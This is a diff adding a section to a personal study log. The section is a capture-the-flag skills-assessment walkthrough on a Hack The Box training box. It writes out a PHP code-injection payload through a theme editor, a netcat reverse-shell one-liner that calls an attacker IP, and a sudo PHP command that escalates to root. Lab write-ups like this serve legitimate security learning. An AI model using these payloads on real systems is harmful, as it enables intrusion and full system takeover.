@@ -108,4 +108,57 @@
 ### Screenshot
 - <img width="500" alt="Mod 2 - Section 18" src="https://github.com/user-attachments/assets/3da768f2-d938-4b15-b0ad-7233da4c1510" />
 
+---
+
+## Section 23 — Skills Assessment (Final Box)
+
+### Objective
+Gain foothold on target and retrieve user.txt, then escalate to root and retrieve root.txt.
+
+### Enumeration
+- Ran `nmap -sV -sC <ip>` → HTTP open, `/admin` directory and `robots.txt` found
+- Browsed to `/admin/` → login page → tried `admin:admin` → successful
+- Explored admin panel tabs: Home, Files, Theme, Backup, Plugins
+- Theme tab revealed directory: `http://gettingstarted.htb/theme/Cardinal/`
+- Home page indicated code execution possible via Theme → Edit Components
+
+### Foothold — RCE via Theme Editor
+- Navigated to `admin/theme/edit-components`
+- Injected `<?php system('id'); ?>` → returned `uid=33...` confirming RCE
+- Replaced with reverse shell payload (`"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"`)
+- Started listener: `nc -lvnp 9443`
+- Triggered shell via browser
+
+### Shell Stabilisation
+- Ran `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- CTRL+Z → `stty raw -echo` → `fg`
+- Issue: terminal went blank, no output visible — reproduced 3 times
+- Fix on fresh Pwnbox: ran `export TERM=xterm` on remote shell
+- Alternative fix learnt: CTRL+J → type `stty sane` blindly → CTRL+J
+
+### User Flag
+- Navigated using `ls` and `cd` → found `user.txt` in `/home` directory
+
+### Privilege Escalation
+- Attempted LinEnum transfer via `python3 -m http.server 8080` + `wget` → file not found error
+- Attempted `curl` download → still failed
+- Ran `sudo -l` → `/usr/bin/php` requires no password
+- Tried `sudo bash -c 'ls -a'` → asked for password, failed
+- Researched PHP sudo escalation
+- Navigated to `/usr/bin`
+- Ran:
+```bash
+  CMD='/bin/sh'
+  sudo /usr/bin/php -r "system('$CMD');"
+```
+- Shell returned as root
+- Navigated to `/root` → retrieved `root.txt` using `cat`
+
+### Key Learnings
+- RCE via admin theme editors is a real and common attack vector
+- Shell stabilisation can fail silently — `export TERM=xterm` fixes blank terminal issue
+- `sudo -l` is always worth running — PHP binary sudo escalation is a GTFOBins classic
+- LinEnum transfer via HTTP server is environment-dependent; always have a backup method
+- Roundabout approaches work — don't fixate on one method
+
 
